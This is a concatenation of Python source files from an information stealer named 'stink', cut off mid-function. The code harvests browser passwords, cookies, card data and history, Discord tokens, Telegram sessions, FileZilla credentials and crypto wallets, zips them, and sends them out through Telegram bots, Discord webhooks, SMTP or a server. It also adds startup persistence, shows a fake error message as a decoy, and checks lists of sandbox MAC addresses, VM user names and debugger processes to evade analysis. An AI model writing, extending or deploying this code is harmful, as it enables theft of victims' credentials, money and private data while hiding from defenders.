# Combined Python Files

from abc import abstractmethod
from base64 import b64decode
from codecs import getencoder
from collections import namedtuple
from ctypes import (
from ctypes import byref, c_buffer, cdll, windll
from ctypes import byref, c_wchar_p, sizeof, windll
from ctypes import byref, create_unicode_buffer, sizeof, windll
from ctypes import windll
from ctypes.wintypes import (
from ctypes.wintypes import CHAR, DWORD, LONG, MAX_PATH, ULONG, WORD
from ctypes.wintypes import DWORD
from dataclasses import dataclass
from datetime import datetime, timedelta
from enum import Enum
from getpass import getuser
from io import BytesIO
from json import load, loads
from json import loads
from mimetypes import guess_type
from multiprocessing import Pool
from os import environ
from os import fsync
from os import getenv, path
from os import listdir, path
from os import listdir, path, walk
from os import path
from os import path, remove
from os import path, walk
from random import choices
from re import DOTALL, IGNORECASE, compile
from re import compile
from re import findall
from shutil import copyfile
from sqlite3 import Connection, Cursor, connect
from string import ascii_lowercase, ascii_uppercase, digits
from string import ascii_uppercase
from struct import pack
from subprocess import CREATE_NEW_CONSOLE, SW_HIDE, Popen
from subprocess import CREATE_NEW_CONSOLE, SW_HIDE, run
from sys import argv
from sys import getwindowsversion
from sys import hexversion
from textwrap import dedent
from threading import Lock, current_thread, main_thread
from threading import Thread
from time import sleep
from typing import Any, AnyStr, List, Optional, Tuple, Union
from typing import Any, Callable, Dict, List, Optional, Tuple, Union
from typing import Any, Dict, Optional, Type
from typing import Any, List
from typing import Any, List, Tuple
from typing import BinaryIO, List, Tuple, Union
from typing import Dict, MutableMapping
from typing import List
from typing import List, Tuple
from typing import Optional
from typing import Tuple, Union
from urllib.request import Request, urlopen
from urllib.request import urlopen
from uuid import getnode
from uuid import uuid4
from winreg import (
from winreg import HKEY_CURRENT_USER, EnumKey, OpenKey, QueryInfoKey, QueryValueEx
from winreg import HKEY_LOCAL_MACHINE, KEY_READ, KEY_WOW64_32KEY, OpenKey, QueryValueEx
from winreg import HKEY_LOCAL_MACHINE, OpenKey, QueryValueEx
from xml.etree import ElementTree
from zipfile import ZIP_DEFLATED, ZipFile
from zlib import compress, crc32
import copy
import platform
import ssl
import struct

# Content from stink/stink/__init__.py



# Content from stink/stink/multistealer.py
import ssl
from multiprocessing import Pool
from sys import argv
from threading import Thread
from time import sleep
from typing import Any, List

from stink.enums import Features, Protectors, Utils
from stink.helpers import MemoryStorage, functions
from stink.helpers.config import Browsers, MultistealerConfig
from stink.modules import (
    Chromium,
    Discord,
    FileZilla,
    Processes,
    Screenshot,
    Steam,
    System,
    Telegram,
    Wallets,
)
from stink.utils import Autostart, Grabber, Loader, Message, Protector


class Stealer(Thread):
    """
    Collects and sends the specified data.
    """

    def __init__(
        self,
        senders: List[Any] = None,
        features: List[Features] = None,
        utils: List[Utils] = None,
        loaders: List[Loader] = None,
        protectors: List[Protectors] = None,
        grabbers: List[Grabber] = None,
        delay: int = 0,
    ):
        Thread.__init__(self, name="Stealer")

        if loaders is None:
            loaders = []

        if grabbers is None:
            grabbers = []

        if senders is None:
            senders = []

        if utils is None:
            utils = []

        if features is None:
            features = [Features.all]

        if protectors is None:
            protectors = [Protectors.disable]

        self.__protectors = protectors
        self.__loaders = loaders
        self.__grabbers = grabbers
        self.__senders = senders
        self.__autostart = Utils.autostart in utils or Utils.all in utils
        self.__message = Utils.message in utils or Utils.all in utils
        self.__delay = delay

        self.__config = MultistealerConfig()
        self.__storage = MemoryStorage()

        browser_functions = [
            module
            for module in [
                Features.passwords,
                Features.cookies,
                Features.cards,
                Features.history,
                Features.bookmarks,
                Features.extensions,
                Features.wallets,
            ]
            if module in features or Features.all in features
        ]
        browser_statuses = len(browser_functions) > 0

        self.__methods = [
            {
                "object": Chromium,
                "arguments": (
                    Browsers.CHROME.value,
                    self.__config.BrowsersData[Browsers.CHROME]["path"],
                    self.__config.BrowsersData[Browsers.CHROME]["process"],
                    browser_functions,
                ),
                "status": browser_statuses,
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.OPERA_GX.value,
                    self.__config.BrowsersData[Browsers.OPERA_GX]["path"],
                    self.__config.BrowsersData[Browsers.OPERA_GX]["process"],
                    browser_functions,
                ),
                "status": browser_statuses,
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.OPERA_DEFAULT.value,
                    self.__config.BrowsersData[Browsers.OPERA_DEFAULT]["path"],
                    self.__config.BrowsersData[Browsers.OPERA_DEFAULT]["process"],
                    browser_functions,
                ),
                "status": browser_statuses,
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.EDGE.value,
                    self.__config.BrowsersData[Browsers.EDGE]["path"],
                    self.__config.BrowsersData[Browsers.EDGE]["process"],
                    browser_functions,
                ),
                "status": browser_statuses,
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.BRAVE.value,
                    self.__config.BrowsersData[Browsers.BRAVE]["path"],
                    self.__config.BrowsersData[Browsers.BRAVE]["process"],
                    browser_functions,
                ),
                "status": browser_statuses,
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.VIVALDI.value,
                    self.__config.BrowsersData[Browsers.VIVALDI]["path"],
                    self.__config.BrowsersData[Browsers.VIVALDI]["process"],
                    browser_functions,
                ),
                "status": browser_statuses,
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.YANDEX.value,
                    self.__config.BrowsersData[Browsers.YANDEX]["path"],
                    self.__config.BrowsersData[Browsers.YANDEX]["process"],
                    browser_functions,
                ),
                "status": browser_statuses,
            },
            {
                "object": System,
                "arguments": ("System",),
                "status": Features.system in features or Features.all in features,
            },
            {
                "object": Processes,
                "arguments": ("System",),
                "status": Features.processes in features or Features.all in features,
            },
            {
                "object": Screenshot,
                "arguments": ("System",),
                "status": Features.screenshot in features or Features.all in features,
            },
            {
                "object": Discord,
                "arguments": ("Programs/Discord",),
                "status": Features.discord in features or Features.all in features,
            },
            {
                "object": Telegram,
                "arguments": ("Programs/Telegram",),
                "status": Features.telegram in features or Features.all in features,
            },
            {
                "object": FileZilla,
                "arguments": ("Programs/FileZilla",),
                "status": Features.filezilla in features or Features.all in features,
            },
            {
                "object": Steam,
                "arguments": ("Programs/Steam",),
                "status": Features.steam in features or Features.all in features,
            },
            {
                "object": Wallets,
                "arguments": ("Wallets",),
                "status": Features.wallets in features or Features.all in features,
            },
        ]

    def run(self) -> None:
        """
        Launches the Stink.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            sleep(self.__delay)

            if self.__message is True:
                Thread(target=Message().run).start()

            Protector(self.__protectors).run()

            ssl._create_default_https_context = ssl._create_unverified_context

            with Pool(processes=self.__config.PoolSize) as pool:
                results = pool.starmap(
                    functions.run_process,
                    [
                        (method["object"], method["arguments"])
                        for method in self.__methods
                        if method["status"] is True
                    ],
                )
            pool.close()

            if self.__grabbers:

                with Pool(processes=self.__config.PoolSize) as pool:
                    grabber_results = pool.starmap(
                        functions.run_process,
                        [(grabber, None) for grabber in self.__grabbers],
                    )
                pool.close()

                results += grabber_results

            data = self.__storage.create_zip(
                [file for data in results if data for file in data.files]
            )
            preview = self.__storage.create_preview(
                [field for data in results if data for field in data.fields]
            )

            for sender in self.__senders:
                sender.run(self.__config.ZipName, data, preview)

            for loader in self.__loaders:
                loader.run()

            if self.__autostart is True:
                Autostart(argv[0]).run()

        except Exception as e:
            print(f"[Multi stealer]: {repr(e)}")


# Content from stink/stink/abstract/__init__.py



# Content from stink/stink/abstract/sender.py
import ssl
from abc import abstractmethod
from io import BytesIO
from typing import Tuple, Union

from stink.helpers import MultipartFormDataEncoder
from stink.helpers.config import SenderConfig


class AbstractSender:
    """
    Template for the sender.
    """

    def __init__(self):

        self.__zip_name = None
        self.__data = None
        self.__preview = None

        self._config = SenderConfig()
        self._encoder = MultipartFormDataEncoder()

    @abstractmethod
    def __get_sender_data(self) -> Tuple[Union[str, bytes], ...]:
        """
        Gets data to send.

        Parameters:
        - None.

        Returns:
        - tuple: A tuple of data.
        """
        ...

    @abstractmethod
    def __send_archive(self) -> None:
        """
        Sends the data.

        Parameters:
        - None.

        Returns:
        - None.
        """
        ...

    @staticmethod
    def _create_unverified_https():
        """
        Disables SSL certificate validation.

        Parameters:
        - None.

        Returns:
        - None.
        """
        ssl._create_default_https_context = ssl._create_unverified_context

    @abstractmethod
    def run(self, zip_name: str, data: BytesIO, preview: str) -> None:
        """
        Launches the sender module.

        Parameters:
        - zip_name [str]: Archive name.
        - data [BytesIO]: BytesIO object.
        - preview [str]: Collected data summary.

        Returns:
        - None.
        """
        ...


# Content from stink/stink/enums/__init__.py



# Content from stink/stink/enums/features.py
from enum import Enum


class Features(Enum):
    passwords = "Passwords"
    cookies = "Cookies"
    cards = "Cards"
    history = "History"
    bookmarks = "Bookmarks"
    extensions = "Extensions"
    processes = "Processes"
    system = "System"
    screenshot = "Screenshot"
    discord = "Discord"
    telegram = "Telegram"
    filezilla = "Filezilla"
    wallets = "Wallets"
    steam = "Steam"
    all = "All"


# Content from stink/stink/enums/protectors.py
from enum import Enum


class Protectors(Enum):
    processes = "Processes"
    mac_address = "Mac address"
    computer = "Computer"
    user = "User"
    hosting = "Hosting"
    http_simulation = "HTTP simulation"
    virtual_machine = "Virtual machine"
    disable = "Disable"
    all = "All"


# Content from stink/stink/enums/senders.py
from stink.senders import Discord, Server, Smtp, Telegram


class Senders:

    @staticmethod
    def server(server: str) -> Server:
        """
        Creates a sender for the server.

        Parameters:
        - server [str]: A link to the rooted server that accepts the file as input.

        Returns:
        - Server: Server sender object.
        """
        return Server(server=server)

    @staticmethod
    def telegram(token: str, user_id: int) -> Telegram:
        """
        Creates a sender for the Telegram.

        Parameters:
        - token [str]: The token of the bot that will send the archive.
        - user_id [int]: ID of the user or chat room where the bot will send the archive to.

        Returns:
        - Telegram: Telegram sender object.
        """
        return Telegram(token=token, user_id=user_id)

    @staticmethod
    def discord(webhook: str) -> Discord:
        """
        Creates a sender for the Discord.

        Parameters:
        - webhook [str]: Hook of the Discord bot.

        Returns:
        - Discord: Discord sender object.
        """
        return Discord(webhook=webhook)

    @staticmethod
    def smtp(
        sender_email: str,
        sender_password: str,
        recipient_email: str,
        smtp_server: str = "smtp.gmail.com",
        smtp_port: int = 587,
    ) -> Smtp:
        """
        Creates a sender for the Email.

        Parameters:
        - sender_email [str]: Sender's email.
        - sender_password [str]: Sender's password.
        - recipient_email [str]: Recipient's email.
        - smtp_server [str]: Smtp server.
        - smtp_port [int]: Smtp port.

        Returns:
        - Smtp: Smtp sender object.
        """
        return Smtp(
            sender_email=sender_email,
            sender_password=sender_password,
            recipient_email=recipient_email,
            smtp_server=smtp_server,
            smtp_port=smtp_port,
        )


# Content from stink/stink/enums/utils.py
from enum import Enum


class Utils(Enum):
    autostart = "Autostart"
    message = "Message"
    all = "All"


# Content from stink/stink/helpers/__init__.py
    BitmapInfo,
    BitmapInfoHeader,
    DataBlob,
    DisplayDevice,
    MemoryStatusEx,
    ProcessEntry32,
    ProcessMemoryCountersEx,
    UlargeInteger,
)

    "MultipartFormDataEncoder",
    "config",
    "functions",
    "dataclasses",
    "DataBlob",
    "ProcessEntry32",
    "ProcessMemoryCountersEx",
    "DisplayDevice",
    "MemoryStatusEx",
    "UlargeInteger",
    "BitmapInfoHeader",
    "BitmapInfo",
    "Screencapture",
    "AESModeOfOperationGCM",
    "MemoryStorage",
]


# Content from stink/stink/helpers/config.py
from enum import Enum
from getpass import getuser
from os import environ
from re import DOTALL, IGNORECASE, compile

sys_root = environ.get("SystemRoot", r"C:\Windows")
user_profile = environ.get("USERPROFILE")
user = getuser()
user_agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"


class Browsers(Enum):
    CHROME = "Chrome"
    OPERA_GX = "Opera GX"
    OPERA_DEFAULT = "Opera Default"
    EDGE = "Microsoft Edge"
    BRAVE = "Brave"
    VIVALDI = "Vivaldi"
    YANDEX = "Yandex"


class ChromiumConfig:

    BookmarksRegex = compile(
        r'"name":\s*"([^\'\"]*)"[\s\S]*"url":\s*"([^\'\"]*)"', IGNORECASE + DOTALL
    )

    PasswordsSQL = "SELECT action_url, username_value, password_value FROM logins"
    CookiesSQL = "SELECT host_key, name, encrypted_value FROM cookies"
    CardsSQL = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
    HistorySQL = "SELECT url FROM visits ORDER BY visit_time DESC LIMIT 30000"
    HistoryLinksSQL = "SELECT url, title, last_visit_time FROM urls WHERE id=%d"

    PasswordsData = "URL: {0}\nUsername: {1}\nPassword: {2}\n\n"
    CookiesData = "{0}\tTRUE\t/\tFALSE\t2538097566\t{1}\t{2}"
    CardsData = "Username: {0}\nNumber: {1}\nExpire Month: {2}\nExpire Year: {3}\n\n"
    HistoryData = "URL: {0}\nTitle: {1}\nLast Visit: {2}\n\n"
    BookmarksData = "Title: {0}\nUrl: {1}\n\n"

    WalletLogs = [
        {
            "name": "Metamask",
            "folders": [
                "nkbihfbeogaeaoehlefnkodbefgpgknn",
                "djclckkglechooblngghdinmeemkbgci",
                "ejbalbakoplchlghecdalmeeeajnimhm",
            ],
        },
        {"name": "Phantom", "folders": ["bfnaelmomeimhlpmgjnjophhpkkoljpa"]},
        {"name": "Binance", "folders": ["fhbohimaelbohpjbbldcngcnapndodjp"]},
        {"name": "Coinbase", "folders": ["hnfanknocfeofbddgcijnmhnfnkdnaad"]},
        {"name": "Trust", "folders": ["egjidjbpglichdcondbcbdnbeeppgdph"]},
        {"name": "Exodus", "folders": ["aholpfdialjgjfhomihkjbmgjidlcdno"]},
    ]


class MultistealerConfig:

    PoolSize = 5
    ZipName = f"{user}-st"

    BrowsersData = {
        Browsers.CHROME: {
            "path": rf"{user_profile}\AppData\Local\Google\Chrome\User Data",
            "process": "chrome.exe",
        },
        Browsers.OPERA_GX: {
            "path": rf"{user_profile}\AppData\Roaming\Opera Software\Opera GX Stable",
            "process": "opera.exe",
        },
        Browsers.OPERA_DEFAULT: {
            "path": rf"{user_profile}\AppData\Roaming\Opera Software\Opera Stable",
            "process": "opera.exe",
        },
        Browsers.EDGE: {
            "path": rf"{user_profile}\AppData\Local\Microsoft\Edge\User Data",
            "process": "msedge.exe",
        },
        Browsers.BRAVE: {
            "path": rf"{user_profile}\AppData\Local\BraveSoftware\Brave-Browser\User Data",
            "process": "brave.exe",
        },
        Browsers.VIVALDI: {
            "path": rf"{user_profile}\AppData\Local\Vivaldi\User Data",
            "process": "vivaldi.exe",
        },
        Browsers.YANDEX: {
            "path": rf"{user_profile}\AppData\Local\Yandex\YandexBrowser\User Data",
            "process": "browser.exe",
        },
    }


class SystemConfig:

    User = user
    IPUrl = "https://ipinfo.io/json"
    SystemData = "User: {0}\nIP: {1}\nMachine Type: {2}\nOS Name: {3}\nMachine Name on Network: {4}\nMonitor: {5}\nCPU: {6}\nGPU: {7}\nRAM:\n{8}\nDrives:\n{9}"


class SenderConfig:

    UserAgent = user_agent


class AutostartConfig:

    AutostartName = "System"
    AutostartPath = (
        rf"{user_profile}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    )


class DiscordConfig:

    TokensPath = rf"{user_profile}\AppData\Roaming\Discord\Local Storage\leveldb"
    UserAgent = user_agent
    DiscordData = "Username: {0}\nEmail: {1}\nPhone: {2}\nBio: {3}\nToken: {4}\n\n"


class TelegramConfig:

    SessionsPath = rf"{user_profile}\AppData\Roaming\Telegram Desktop"


class FileZillaConfig:

    SitesPath = rf"{user_profile}\AppData\Roaming\FileZilla"
    DataFiles = ("recentservers.xml", "sitemanager.xml")
    FileZillaData = "Name: {0}\nUser: {1}\nPassword: {2}\nHost: {3}\nPort: {4}\n\n"


class MessageConfig:

    MessageTitle = "0x17"
    MessageDescription = "ERROR_CRC: Data error (cyclic redundancy check)."


class WalletsConfig:

    WalletPaths = [
        {
            "name": "Atomic",
            "path": rf"{user_profile}\AppData\Roaming\atomic\Local Storage\leveldb",
        },
        {
            "name": "Exodus",
            "path": rf"{user_profile}\AppData\Roaming\Exodus\exodus.wallet",
        },
        {
            "name": "Electrum",
            "path": rf"{user_profile}\AppData\Roaming\Electrum\wallets",
        },
        {
            "name": "Ethereum",
            "path": rf"{user_profile}\AppData\Roaming\Ethereum\keystore",
        },
        {"name": "Armory", "path": rf"{user_profile}\AppData\Roaming\Armory"},
        {"name": "Bytecoin", "path": rf"{user_profile}\AppData\Roaming\bytecoin"},
        {
            "name": "Guarda",
            "path": rf"{user_profile}\AppData\Roaming\Guarda\Local Storage\leveldb",
        },
        {
            "name": "Coinomi",
            "path": rf"{user_profile}\AppData\Local\Coinomi\Coinomi\wallets",
        },
        {"name": "Zcash", "path": rf"{user_profile}\AppData\Local\Zcash"},
    ]


class ProtectorConfig:

    MacAddresses = (
        "00:03:47:63:8b:de",
        "00:0c:29:05:d8:6e",
        "00:0c:29:2c:c1:21",
        "00:0c:29:52:52:50",
        "00:0d:3a:d2:4f:1f",
        "00:15:5d:00:00:1d",
        "00:15:5d:00:00:a4",
        "00:15:5d:00:00:b3",
        "00:15:5d:00:00:c3",
        "00:15:5d:00:00:f3",
        "00:15:5d:00:01:81",
        "00:15:5d:00:02:26",
        "00:15:5d:00:05:8d",
        "00:15:5d:00:05:d5",
        "00:15:5d:00:06:43",
        "00:15:5d:00:07:34",
        "00:15:5d:00:1a:b9",
        "00:15:5d:00:1c:9a",
        "00:15:5d:13:66:ca",
        "00:15:5d:13:6d:0c",
        "00:15:5d:1e:01:c8",
        "00:15:5d:23:4c:a3",
        "00:15:5d:23:4c:ad",
        "00:15:5d:b6:e0:cc",
        "00:1b:21:13:15:20",
        "00:1b:21:13:21:26",
        "00:1b:21:13:26:44",
        "00:1b:21:13:32:20",
        "00:1b:21:13:32:51",
        "00:1b:21:13:33:55",
        "00:23:cd:ff:94:f0",
        "00:25:90:36:65:0c",
        "00:25:90:36:65:38",
        "00:25:90:36:f0:3b",
        "00:25:90:65:39:e4",
        "00:50:56:97:a1:f8",
        "00:50:56:97:ec:f2",
        "00:50:56:97:f6:c8",
        "00:50:56:a0:06:8d",
        "00:50:56:a0:38:06",
        "00:50:56:a0:39:18",
        "00:50:56:a0:45:03",
        "00:50:56:a0:59:10",
        "00:50:56:a0:61:aa",
        "00:50:56:a0:6d:86",
        "00:50:56:a0:84:88",
        "00:50:56:a0:af:75",
        "00:50:56:a0:cd:a8",
        "00:50:56:a0:d0:fa",
        "00:50:56:a0:d7:38",
        "00:50:56:a0:dd:00",
        "00:50:56:ae:5d:ea",
        "00:50:56:ae:6f:54",
        "00:50:56:ae:b2:b0",
        "00:50:56:ae:e5:d5",
        "00:50:56:b3:05:b4",
        "00:50:56:b3:09:9e",
        "00:50:56:b3:14:59",
        "00:50:56:b3:21:29",
        "00:50:56:b3:38:68",
        "00:50:56:b3:38:88",
        "00:50:56:b3:3b:a6",
        "00:50:56:b3:42:33",
        "00:50:56:b3:4c:bf",
        "00:50:56:b3:50:de",
        "00:50:56:b3:91:c8",
        "00:50:56:b3:94:cb",
        "00:50:56:b3:9e:9e",
        "00:50:56:b3:a9:36",
        "00:50:56:b3:d0:a7",
        "00:50:56:b3:dd:03",
        "00:50:56:b3:ea:ee",
        "00:50:56:b3:ee:e1",
        "00:50:56:b3:f6:57",
        "00:50:56:b3:fa:23",
        "00:e0:4c:42:c7:cb",
        "00:e0:4c:44:76:54",
        "00:e0:4c:46:cf:01",
        "00:e0:4c:4b:4a:40",
        "00:e0:4c:56:42:97",
        "00:e0:4c:7b:7b:86",
        "00:e0:4c:94:1f:20",
        "00:e0:4c:b3:5a:2a",
        "00:e0:4c:b8:7a:58",
        "00:e0:4c:cb:62:08",
        "00:e0:4c:d6:86:77",
        "06:75:91:59:3e:02",
        "08:00:27:3a:28:73",
        "08:00:27:45:13:10",
        "12:1b:9e:3c:a6:2c",
        "12:8a:5c:2a:65:d1",
        "12:f8:87:ab:13:ec",
        "16:ef:22:04:af:76",
        "1a:6c:62:60:3b:f4",
        "1c:99:57:1c:ad:e4",
        "1e:6c:34:93:68:64",
        "2e:62:e8:47:14:49",
        "2e:b8:24:4d:f7:de",
        "32:11:4d:d0:4a:9e",
        "3c:ec:ef:43:fe:de",
        "3c:ec:ef:44:00:d0",
        "3c:ec:ef:44:01:0c",
        "3c:ec:ef:44:01:aa",
        "3e:1c:a1:40:b7:5f",
        "3e:53:81:b7:01:13",
        "3e:c1:fd:f1:bf:71",
        "42:01:0a:8a:00:22",
        "42:01:0a:8a:00:33",
        "42:01:0a:8e:00:22",
        "42:01:0a:96:00:22",
        "42:01:0a:96:00:33",
        "42:85:07:f4:83:d0",
        "4e:79:c0:d9:af:c3",
        "4e:81:81:8e:22:4e",
        "52:54:00:3b:78:24",
        "52:54:00:8b:a6:08",
        "52:54:00:a0:41:92",
        "52:54:00:ab:de:59",
        "52:54:00:b3:e4:71",
        "56:b0:6f:ca:0a:e7",
        "56:e8:92:2e:76:0d",
        "5a:e2:a6:a4:44:db",
        "5e:86:e4:3d:0d:f6",
        "60:02:92:3d:f1:69",
        "60:02:92:66:10:79",
        "7e:05:a3:62:9c:4d",
        "90:48:9a:9d:d5:24",
        "92:4c:a8:23:fc:2e",
        "94:de:80:de:1a:35",
        "96:2b:e9:43:96:76",
        "a6:24:aa:ae:e6:12",
        "ac:1f:6b:d0:48:fe",
        "ac:1f:6b:d0:49:86",
        "ac:1f:6b:d0:4d:98",
        "ac:1f:6b:d0:4d:e4",
        "b4:2e:99:c3:08:3c",
        "b4:a9:5a:b1:c6:fd",
        "b6:ed:9d:27:f4:fa",
        "be:00:e5:c5:0c:e5",
        "c2:ee:af:fd:29:21",
        "c8:9f:1d:b6:58:e4",
        "ca:4d:4b:ca:18:cc",
        "d4:81:d7:87:05:ab",
        "d4:81:d7:ed:25:54",
        "d6:03:e4:ab:77:8e",
        "ea:02:75:3c:90:9f",
        "ea:f6:f1:a2:33:76",
        "f6:a5:41:31:b2:78",
    )

    Computers = (
        "BEE7370C-8C0C-4",
        "DESKTOP-NAKFFMT",
        "WIN-5E07COS9ALR",
        "B30F0242-1C6A-4",
        "DESKTOP-VRSQLAG",
        "Q9IATRKPRH",
        "XC64ZB",
        "DESKTOP-D019GDM",
        "DESKTOP-WI8CLET",
        "SERVER1",
        "LISA-PC",
        "JOHN-PC",
        "DESKTOP-B0T93D6",
        "DESKTOP-1PYKP29",
        "DESKTOP-1Y2433R",
        "WILEYPC",
        "WORK",
        "6C4E733F-C2D9-4",
        "RALPHS-PC",
        "DESKTOP-WG3MYJS",
        "DESKTOP-7XC6GEZ",
        "DESKTOP-5OV9S0O",
        "QarZhrdBpj",
        "ORELEEPC",
        "ARCHIBALDPC",
        "JULIA-PC",
        "d1bnJkfVlH",
        "NETTYPC",
        "DESKTOP-BUGIO",
        "DESKTOP-CBGPFEE",
        "SERVER-PC",
        "TIQIYLA9TW5M",
        "DESKTOP-KALVINO",
        "COMPNAME_4047",
        "DESKTOP-19OLLTD",
        "DESKTOP-DE369SE",
        "EA8C2E2A-D017-4",
        "AIDANPC",
        "LUCAS-PC",
        "ACEPC",
        "MIKE-PC",
        "DESKTOP-IAPKN1P",
        "DESKTOP-NTU7VUO",
        "LOUISE-PC",
        "T00917",
        "test42",
        "DESKTOP-CM0DAW8",
    )

    Users = (
        "BEE7370C-8C0C-4",
        "DESKTOP-NAKFFMT",
        "WIN-5E07COS9ALR",
        "B30F0242-1C6A-4",
        "DESKTOP-VRSQLAG",
        "Q9IATRKPRH",
        "XC64ZB",
        "DESKTOP-D019GDM",
        "DESKTOP-WI8CLET",
        "SERVER1",
        "DESKTOP-B0T93D6",
        "DESKTOP-1PYKP29",
        "DESKTOP-1Y2433R",
        "WILEYPC",
        "WORK",
        "6C4E733F-C2D9-4",
        "RALPHS-PC",
        "DESKTOP-WG3MYJS",
        "DESKTOP-7XC6GEZ",
        "DESKTOP-5OV9S0O",
        "QarZhrdBpj",
        "ORELEEPC",
        "ARCHIBALDPC",
        "JULIA-PC",
        "d1bnJkfVlH",
        "WDAGUtilityAccount",
        "ink",
        "RDhJ0CNFevzX",
        "kEecfMwgj",
        "8Nl0ColNQ5bq",
        "PxmdUOpVyx",
        "8VizSM",
        "w0fjuOVmCcP5A",
        "lmVwjj9b",
        "PqONjHVwexsS",
        "3u2v9m8",
        "HEUeRzl",
        "BvJChRPnsxn",
        "SqgFOf3G",
        "h7dk1xPr",
        "RGzcBUyrznReg",
        "OgJb6GqgK0O",
        "4CrA8IZTwHZe",
        "abhcolem",
        "28DnZnMtF0w",
        "4qZR8",
        "a7mEbvN6",
        "w5lwDo8hdU24",
        "ZGuuuZQW",
    )

    Tasks = (
        "ProcessHacker.exe",
        "httpdebuggerui.exe",
        "wireshark.exe",
        "fiddler.exe",
        "regedit.exe",
        "cmd.exe",
        "taskmgr.exe",
        "vboxservice.exe",
        "df5serv.exe",
        "processhacker.exe",
        "vboxtray.exe",
        "vmtoolsd.exe",
        "vmwaretray.exe",
        "vmwareservice.exe",
        "ida64.exe",
        "ollydbg.exe",
        "pestudio.exe",
        "vmwareuser.exe",
        "vgauthservice.exe",
        "vmacthlp.exe",
        "vmsrvc.exe",
        "x32dbg.exe",
        "x64dbg.exe",
        "x96dbg.exe",
        "vmusrvc.exe",
        "prl_cc.exe",
        "prl_tools.exe",
        "qemu-ga.exe",
        "joeboxcontrol.exe",
        "ksdumperclient.exe",
        "xenservice.exe",
        "joeboxserver.exe",
        "devenv.exe",
        "IMMUNITYDEBUGGER.EXE",
        "ImportREC.exe",
        "reshacker.exe",
        "windbg.exe",
        "32dbg.exe",
        "64dbg.exe",
        "protection_id.exe",
        "scylla_x86.exe",
        "scylla_x64.exe",
        "scylla.exe",
        "idau64.exe",
        "idau.exe",
        "idaq64.exe",
        "idaq.exe",
        "idaq.exe",
        "idaw.exe",
        "idag64.exe",
        "idag.exe",
        "ida64.exe",
        "ida.exe",
        "ollydbg.exe",
        "fakenet.exe",
        "dumpcap.exe",
    )

    Cards = ("virtualbox", "vmware")

    RegistryEnums = ("vmware", "qemu", "virtio", "vbox", "xen", "VMW", "Virtual")

    Dlls = (rf"{sys_root}\System32\vmGuestLib.dll", rf"{sys_root}\vboxmrxnp.dll")

    IPUrl = "http://ip-api.com/line/?fields=hosting"


# Content from stink/stink/helpers/dataclasses.py
from dataclasses import dataclass
from typing import Any, List, Tuple


@dataclass
class Field:
    name: str = ""
    value: Any = 0


@dataclass
class Data:
    files: List[Tuple]
    fields: List[Field]


# Content from stink/stink/helpers/functions.py
from typing import Any, List, Tuple

from stink.helpers.dataclasses import Data


def create_table(header: List[Any], rows: List[Any]) -> str:
    """
    Generates a table from the data.

    Parameters:
    - header [list]: List of header columns.
    - rows [list]: List of rows.

    Returns:
    - str: A rendered table with data.
    """
    num_columns = len(rows[0])
    col_widths = [
        max(len(str(header[i])), *(len(str(row[i])) for row in rows))
        for i in range(num_columns)
    ]

    horizontal_border = (
        "+" + "+".join(["-" * (width + 2) for width in col_widths]) + "+"
    )
    header_row = (
        "|"
        + "|".join(
            [
                " " + str(header[i]).ljust(col_widths[i]) + " "
                for i in range(num_columns)
            ]
        )
        + "|"
    )

    yield horizontal_border
    yield header_row
    yield horizontal_border

    for row in rows:
        yield "|" + "|".join(
            [" " + str(row[i]).ljust(col_widths[i]) + " " for i in range(num_columns)]
        ) + "|"
        yield horizontal_border


def run_process(process: Any, arguments: Tuple = None) -> Data:
    """
    Starts the process.

    Parameters:
    - process [any]: Class object.
    - arguments [tuple]: Tuple of arguments for process.

    Returns:
    - List: List of collected files.
    """
    if not arguments:
        return process.run()

    return process(*arguments).run()


# Content from stink/stink/helpers/multipart.py
from codecs import getencoder
from io import BytesIO
from mimetypes import guess_type
from sys import hexversion
from typing import BinaryIO, List, Tuple, Union
from uuid import uuid4


class MultipartFormDataEncoder(object):
    """
    Creates a multipart/form-data content type.
    """

    def __init__(self):
        self.__boundary = uuid4().hex

    @classmethod
    def u(cls, string: Union[str, bytes]) -> str:
        """
        Decodes the string.

        Parameters:
        - string [str|bytes]: String or bytes to be decoded.

        Returns:
        - str: Decoding result.
        """
        if hexversion < 0x03000000 and isinstance(string, str):
            string = string.decode("utf-8")

        if hexversion >= 0x03000000 and isinstance(string, bytes):
            string = string.decode("utf-8")

        return string

    def iter(
        self,
        fields: List[Tuple[str, Union[str, int]]],
        files: List[Tuple[str, str, Union[BinaryIO, BytesIO]]],
    ) -> str:
        """
        Writes fields and files to the body.

        Parameters:
        - fields [list]: Fields for writing.
        - files [list]: Files for writing.

        Returns:
        - str: Result of file processing.
        """
        encoder = getencoder("utf-8")

        for key, value in fields:

            key = self.u(key)

            yield encoder(f"--{self.__boundary}\r\n")
            yield encoder(
                self.u(f'Content-Disposition: form-data; name="{key}"\r\n\r\n')
            )

            if isinstance(value, int) or isinstance(value, float):
                value = str(value)

            yield encoder(self.u(f"{value}\r\n"))

        for key, filename, filedata in files:

            key = self.u(key)
            filename = self.u(filename)

            yield encoder(f"--{self.__boundary}\r\n")
            yield encoder(
                self.u(
                    f'Content-Disposition: form-data; name="{key}"; filename="{filename}"\r\n'
                )
            )
            yield encoder(
                f"Content-Type: {guess_type(filename)[0] or 'application/octet-stream'}\r\n\r\n"
            )

            if type(filedata) is BytesIO:
                buffer = filedata.getvalue()
            else:
                buffer = filedata.read()

            yield buffer, len(buffer)
            yield encoder("\r\n")

        yield encoder(f"--{self.__boundary}--\r\n")

    def encode(
        self,
        fields: List[Tuple[str, Union[str, int]]],
        files: List[Tuple[str, str, BinaryIO]],
    ) -> Tuple[str, bytes]:
        """
        Converts specified files and fields to multipart/form-data format.

        Parameters:
        - fields [list]: Fields for converting.
        - files [list]: Files for converting.

        Returns:
        - tuple: Multipart/form-data file representation.
        """
        try:

            body = BytesIO()

            for chunk, chunk_len in self.iter(fields, files):
                body.write(chunk)

